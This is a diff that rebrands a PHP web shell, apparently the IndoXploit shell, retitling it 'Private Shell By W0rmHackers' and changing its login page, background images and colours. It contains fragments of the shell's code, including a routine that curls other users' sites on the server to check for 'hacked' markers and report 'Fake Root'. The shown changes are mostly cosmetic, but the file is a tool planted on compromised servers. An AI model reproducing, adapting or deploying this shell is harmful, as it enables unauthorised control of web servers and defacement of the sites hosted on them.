@@ -32,11 +32,12 @@ function login_shell() {
 <!DOCTYPE HTML>
 <html>
 <head>
-<title>xXx TiaraHayatunnufus xXx</title>
+<title>&#1203;&#824;&#1202;&#824;&#1203; Uknown Private Shell By W0rmHackers &#1203;&#824;&#1202;&#824;&#1203;</title>
 <style type="text/css">
+@import url(https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two);
 html {
 	margin: 20px auto;
-	background: black url("https://scontent-sit4-1.cdninstagram.com/vp/bbc0ec97f13466028ca3d6fe9cb19b41/5B059E5C/t51.2885-15/e35/26871101_168324457142987_8215584499451297792_n.jpg");background-repeat: repeat;
+	background: black url("https://www.wallpaperup.com/uploads/wallpapers/2013/01/19/30361/dc9bb414a033342fa7656f87b7911f5b.jpg");background-repeat: repeat;
     background-attachment: fixed;
     background-position: center; 
 	color: red;
@@ -59,8 +60,8 @@ input[type=password] {
 </head>
 <center>
 <header>
-	<pre>
-<script language="JavaScript"><!-- Begin var Color= new Array(9); Color[1] = "ff"; Color[2] = "ee"; Color[3] = "dd"; Color[4] = "cc"; Color[5] = "bb"; Color[6] = "aa"; Color[7] = "99"; Color[8] = "88"; Color[9] = "77"; Color[10] = "66"; Color[11] = "55"; Color[12] = "44"; Color[13] = "33"; Color[14] = "22"; Color[15] = "11"; Color[16] = "00"; function fadeIn(where) { if (where >= 1) { document.bgColor="#" + Color[where] +"0000"; where -= 1; setTimeout("fadeIn("+where+")", 15); } else { setTimeout('fadeOut(1)', 15); } } function fadeOut(where) { if (where <=16) { document.bgColor="#" + Color[where] +"0000"; where += 1; setTimeout("fadeOut("+where+")", 15) } else { setTimeout("fadeIn(16)", 15); } } // End --></script><br><br><center><div class="imagehold"><font color="white" face="Courier New"><pre style="font: 8px/8px monospace">  </pre></font></div></center><br><center></center><br><center><font color="black"><center><strong><span style="font-family: Time New Romain;"><span style="font-size: 16px;"><font face="impact" class="hk" size="7" style="text-shadow: 0px 0px 10px rgb(245, 1, 11);"><span style="color: rgb(10, 9, 11);">xXx BabyCrazy Galau xXx</span></font>
+	<pre><b>
+<font size="10" face="Shadows Into Light Two" color="Red">&#1203;&#824;&#1202;&#824;&#1203; Who Am  i? &#1203;&#824;&#1202;&#824;&#1203;</span></font>
 	</pre>
 </header>
 <form method="post">
@@ -111,17 +112,17 @@ if(get_magic_quotes_gpc()) {
 ###############################################################################
 -->
 <head>
-<title>AraHaxor</title>
+<title>&#1203;&#824;&#1202;&#824;&#1203;  By W0rmHackers &#1203;&#824;&#1202;&#824;&#1203;</title>
 <meta name='author' content='IndoXploit'>
 <meta charset="UTF-8">
 <style type='text/css'>
 @import url(https://fonts.googleapis.com/css?family=Ubuntu);
 html {
-    background: black url("https://scontent-sit4-1.cdninstagram.com/vp/bbc0ec97f13466028ca3d6fe9cb19b41/5B059E5C/t51.2885-15/e35/26871101_168324457142987_8215584499451297792_n.jpg");background-repeat: repeat;
+    background: black url("https://www.wallpaperup.com/uploads/wallpapers/2013/01/19/30361/dc9bb414a033342fa7656f87b7911f5b.jpg");background-repeat: repeat;
     background-attachment: fixed;
     background-position: center; 
 
-	color: #ffffff;
+	color: purple;
 	font-size: 14px;
 	width: 100%;
 }
@@ -133,7 +134,7 @@ li {
 }
 
 a {
-	color: #ffffff;
+	color: purple;
 	text-decoration: none;
 }
 
@@ -162,11 +163,11 @@ table, th, td {
 }
 
 .th_home {
-	color: lime;
+	color: purple;
 }
 
 .td_home, .td_home > a {
-	color: #ffffff;
+	color: purple;
 }
 
 .td_home > a:hover {
@@ -179,7 +180,7 @@ th {
 
 tr:hover {
 	background: #006400;
-	color: #ffffff;
+	color: purple;
 }
 
 input[type=text], input[type=password], .input {
@@ -237,8 +238,8 @@ function color($bold = 1, $colorid = null, $string = null) {
 		$color = array(
 			"</font>",  			# 0 off
 			"<font color='red'>",	# 1 red 
-			"<font color='lime'>",	# 2 lime
-			"<font color='white'>",	# 3 white
+			"<font color='purple'>",	# 2 lime
+			"<font color='purple'>",	# 3 white
 			"<font color='gold'>",	# 4 gold
 		);
 
@@ -1640,7 +1641,7 @@ function action() {
 				foreach($site as $url) {
 					$cek = curl("$url/~$user/$file");
 					if(preg_match("/hacked/i", $cek)) {
-						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
+						print "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=purple>Fake Root!</font><br>";
 					}
 				}
 			} else {
